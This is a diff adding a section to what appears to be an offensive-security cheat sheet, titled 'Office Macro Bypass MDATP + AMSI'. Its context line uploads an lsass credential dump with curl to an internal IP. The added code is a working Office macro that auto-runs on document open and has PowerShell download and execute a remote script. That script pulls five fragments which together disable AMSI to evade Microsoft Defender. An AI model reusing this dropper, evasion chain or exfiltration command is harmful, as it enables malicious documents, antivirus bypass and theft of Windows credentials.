@@ -1107,3 +1107,57 @@ Client side cmd:
 curl.exe http://10.10.13.14:8080/lsass.txt --upload-file lsass.txt
 ```
 ---
+
+### Office Macro Bypass MDATP + AMSI
+Macro:
+```vbs
+Sub AutoOpen()
+Set shell_object = CreateObject("WScript.Shell")
+shell_object.Exec ("powershell -c iwr http://192.168.17.131/test.txt -o $env:temp\test.txt; IEX(gc -raw $env:temp\test.txt)")
+End Sub
+
+Sub Workbook_Open()
+Set shell_object = CreateObject("WScript.Shell")
+shell_object.Exec ("powershell -c iwr http://192.168.17.131/test.txt -o $env:temp\test.txt; IEX(gc -raw $env:temp\test.txt)")
+End Sub
+
+Sub Auto_Open()
+Set shell_object = CreateObject("WScript.Shell")
+shell_object.Exec ("powershell -c iwr http://192.168.17.131/test.txt -o $env:temp\test.txt; IEX(gc -raw $env:temp\test.txt)")
+End Sub
+```
+test.txt:
+```powershell
+IEX(New-Object Net.WEbClient).downloadString("http://192.168.17.131/b1.txt")
+IEX(New-Object Net.WEbClient).downloadString("http://192.168.17.131/b2.txt")
+IEX(New-Object Net.WEbClient).downloadString("http://192.168.17.131/b3.txt")
+IEX(New-Object Net.WEbClient).downloadString("http://192.168.17.131/b4.txt")
+IEX(New-Object Net.WEbClient).downloadString("http://192.168.17.131/b5.txt")
+IEX(New-Object Net.WEbClient).downloadString("http://192.168.17.131/test2.txt")
+```
+b1.txt
+```
+$a=[Ref].Assembly.GetTypes()
+```
+
+b2.txt
+```
+Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};
+```
+
+b3.txt
+```
+$d=$c.GetFields('NonPublic,Static')
+```
+
+b4.txt
+```
+Foreach($e in $d) {if ($e.Name -like "*InitFa*") {$f=$e}}
+```
+
+b5.txt
+```
+$g=$f.setValue($null, $true)
+```
+
+---
